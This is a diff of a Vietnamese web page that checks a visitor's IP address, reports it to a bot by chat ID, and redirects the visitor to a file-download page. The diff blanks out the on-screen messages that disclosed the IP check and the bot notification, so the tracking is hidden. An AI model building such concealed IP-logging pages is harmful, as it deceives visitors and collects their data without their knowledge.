@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Xác Nhận IP & Chuyển Hướng</title>
+  <title>....</title>
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; font-family: Arial, sans-serif; }
     body {
@@ -71,7 +71,7 @@
 </head>
 <body>
   <div class="card">
-    <h1 id="titleText">🔍 Đang Kiểm Tra IP...</h1>
+    <h1 id="titleText">🔍 ...</h1>
     <p class="desc" id="descText">Vui lòng chờ trong giây lát...</p>
 
     <div class="box" id="infoBox">
@@ -281,7 +281,7 @@
       infoBox.classList.add("center");
       titleText.textContent = "✅ IP Đã Được Xác Nhận";
       titleText.style.color = "#4ade80";
-      descText.textContent = "Đã gửi thông báo về bot. Đang chuyển hướng đến trang nhận file...";
+      descText.textContent = "...";
       ipText.textContent = ip;
       statusText.textContent = "Đã xác nhận IP";
       statusText.className = "status-ok";
@@ -306,8 +306,8 @@
     }
 
     async function runStep2ReceiveFile(passedIp, chatId) {
-      titleText.textContent = "🔍 Đang Xác Nhận IP Nhận File...";
-      descText.textContent = "Hệ thống đang kiểm tra IP, gửi thông báo về bot và chuyển hướng nhận file.";
+      titleText.textContent = "🔍 ...";
+      descText.textContent = ".";
 
       const detectedIp = await fetchClientIp();
       const finalIp = detectedIp || passedIp;
